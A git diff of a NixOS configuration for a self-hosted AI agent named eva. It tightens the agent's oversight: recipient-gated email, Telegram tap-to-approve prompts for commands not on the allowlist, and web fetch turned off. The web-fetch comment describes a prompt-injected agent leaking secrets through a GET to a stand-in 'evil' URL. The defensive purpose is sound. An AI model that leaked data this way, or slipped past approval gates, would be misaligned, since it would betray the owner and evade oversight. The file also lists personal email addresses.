@@ -78,7 +78,7 @@ let
         ../../modules/openclaw
         ../../modules/tor-bridge
         ../../modules/push-notifications
-        ../../modules/mail-relay
+        ../../modules/mail-server
         ../../modules/prefect-server
         ../../modules/home-assistant
         ../../modules/server-stats
@@ -488,6 +488,21 @@ let
         fallbackModels = [ ];
         settings.agents.defaults.subagents.model = "anthropic/claude-opus-4-8";
 
+        # Eva's email: read her Maildir + a recipient-gated send-email helper.
+        # These addresses (all the owner's own) send with no approval; every
+        # other recipient falls through to the Telegram gate. The module generates
+        # the send-email wrapper, read-only tools, allowlist rules and the skill.
+        mail = {
+          enable = true;
+          fromAddress = "e.lebbot@acpuchades.com";
+          unpromptedRecipients = [
+            "acp1337@proton.me"
+            "acaravaca@idibell.cat"
+            "acaravaca@bellvitgehospital.cat"
+            "acaravacapuchades@uoc.edu"
+          ];
+        };
+
         # Exec policy: allowlist + confirm-on-miss, via the module's first-class
         # options (pinned every start, so eva can't self-escalate at runtime).
         # Only allowlisted commands run unprompted; anything else raises an
@@ -505,6 +520,11 @@ let
         # without a rebuild via `openclaw approvals allowlist add "<glob>"` (e.g.
         # "git status", "git diff*") — per-agent state, not re-seeded here.
         exec = {
+          # security back on "allowlist" (was briefly "full" for a diagnostic that
+          # confirmed the exec gate was the blocker). Kept "allowlist" + ask
+          # "on-miss" so a non-allowlisted command MISSES and must go through the
+          # approval path — the allowlist below is emptied on purpose to test
+          # whether approvals actually surface over Telegram.
           security = "allowlist";
           ask = "on-miss";
           strictInlineEval = true;
@@ -521,44 +541,41 @@ let
             "sha1sum" "sha512sum" "b2sum" "base64" "base32"
             "xxd" "hexdump" "od" "strings"
           ];
-          # Pre-seeded full-command-line globs (merged with eva's own runtime
-          # additions). These bless read-only SUBCOMMANDS of tools too dangerous
-          # to whole-binary allowlist — only forms that cannot mutate. eva works
-          # in git repos and inspects services/logs/nix, so:
-          allowlist = [
-            # git — read-only porcelain/plumbing only. NOT "git branch*"/"git
-            # tag*"/"git remote*" (they'd also match -d/-D/add/remove/rename).
-            "git status*" "git log*" "git diff*" "git show*" "git blame*"
-            "git rev-parse*" "git describe*" "git ls-files*" "git shortlog*"
-            "git reflog*" "git cat-file*" "git branch --list*" "git remote -v"
-            "git config --get*" "git config --list*"
-            # systemctl — inspection subcommands (status/show/list/is-* never
-            # mutate). Restart/stop/start still go through her gated sudo grant.
-            "systemctl status*" "systemctl show*" "systemctl cat*"
-            "systemctl list-units*" "systemctl list-timers*"
-            "systemctl list-unit-files*" "systemctl is-active*"
-            "systemctl is-enabled*" "systemctl is-failed*"
-            "systemctl --user status*" "systemctl --user list-units*"
-            # nix — read-only query subcommands (no build/gc/store mutation).
-            "nix eval*" "nix flake metadata*" "nix flake show*" "nix search*"
-            "nix path-info*" "nix store ls*" "nix-instantiate --parse*"
-            "nixos-version*"
-          ];
+          # EMPTIED ON PURPOSE (approval test, 2026-07-27): every non-safeBin
+          # command now MISSES so it must go through the approval path — use this
+          # to check whether approvals actually surface over Telegram. Restore the
+          # git/systemctl/nix read-only globs + the git write ops (see git history
+          # of this file) once the approval question is settled.
+          allowlist = [ ];
         };
         settings.tools.fs.workspaceOnly = false; # filesystem tools beyond the workspace (ACL-granted paths)
-        # "approvals.exec.enabled" only controls FORWARDING approval prompts to
-        # OTHER channels; the prompt already surfaces in the origin Telegram DM,
-        # the only channel eva has, so forwarding stays off (explicit).
-        settings.approvals.exec.enabled = false;
+        # Exec approval prompts: make Telegram a NATIVE approval client so a
+        # missed command raises an inline approve/deny prompt in the owner DM
+        # (tap to allow-once / allow-always / deny) instead of blocking silently
+        # until the CLI no-output watchdog kills the turn ("Something went wrong").
+        # This is `channels.telegram.execApprovals`. The generic `approvals.exec.*`
+        # forwarding pipeline is a DIFFERENT mechanism (relays a text `/approve
+        # <id>` to *other* destinations) and does NOT render the native DM prompt —
+        # setting it (even enabled=true, mode=session) delivered nothing, which is
+        # why misses just hung. `approvers` auto-resolves from commands.ownerAllowFrom,
+        # which ExecStartPre already patches with the owner's numeric ID from the
+        # SOPS secret — so no plaintext ID is needed in the repo.
+        settings.channels.telegram.execApprovals.enabled = true;
+        settings.channels.telegram.execApprovals.target = "dm";
+        # The inline tap-to-approve keyboard only renders if inline buttons are
+        # allowed on the DM surface (enum: off|dm|group|all|allowlist). The prior
+        # "allowlist" value was ambiguous for approvals; "dm" allows it explicitly.
+        settings.channels.telegram.capabilities.inlineButtons = "dm";
 
-        # Web access: lightweight HTTP fetch only, for now. The DuckDuckGo search
-        # plugin's bundled surface (duckduckgo/web-search-contract-api.js) used to
-        # fail to load here for the SAME reason the google provider did — the
-        # store-hardlink boundary guard, now patched in the module. It may load
-        # after that fix, but it also reported "required secrets are unavailable"
-        # (its own key requirement), so it stays disabled until revisited;
-        # web_fetch needs no plugin.
-        settings.tools.web.fetch.enabled = true;
+        # Web access: DISABLED as a data-exfiltration guard. web_fetch runs
+        # OUTSIDE the exec allowlist and its destination cannot be constrained the
+        # way an email recipient can — a prompt-injected agent could GET
+        # https://evil/?secret=… and leak data in the URL with no gate. Email is
+        # the only outbound channel we allow unprompted precisely because the
+        # recipient IS constrainable (see my.openclaw.mail). If eva ever needs to
+        # read the web, add it back as a gated/constrained capability, not this
+        # ungated fetch. (The DuckDuckGo search plugin is likewise off.)
+        settings.tools.web.fetch.enabled = false;
 
         # Reply text-to-speech via ElevenLabs, through the module's tts options.
         # auto="inbound" = she only speaks when YOU send a voice message
@@ -604,6 +621,7 @@ let
           "/run/current-system/sw/bin/nixos-rebuild"
           "/run/current-system/sw/bin/systemctl"
           "/run/current-system/sw/bin/shutdown"
+          "/run/current-system/sw/bin/reboot"
           "/run/current-system/sw/bin/journalctl"
         ];
 
@@ -677,13 +695,17 @@ let
         };
       };
 
-      my.mail-relay = {
+      my.mail-server = {
         enable = true;
+        hostname = "mail.acpuchades.com";
         origin = "acpuchades.com";
-        hostname = "home.acpuchades.com";
+        # Public identity e.lebbot@acpuchades.com is a Cloudflare Email Routing
+        # alias forwarding to eva@mail.acpuchades.com, which (mailDomain being
+        # local) delivers straight to the eva system user's ~/Maildir.
+        mailDomain = "mail.acpuchades.com";
         relayHost = "[in-v3.mailjet.com]:587";
         saslPasswordFile = config.sops.templates."postfix/sasl_passwd".path;
-        destinations = ["localhost" "localhost.localdomain"];
+        acmeEnvironmentFile = config.sops.templates."acme/cloudflare-env".path;
       };
 
       my.home-assistant = {
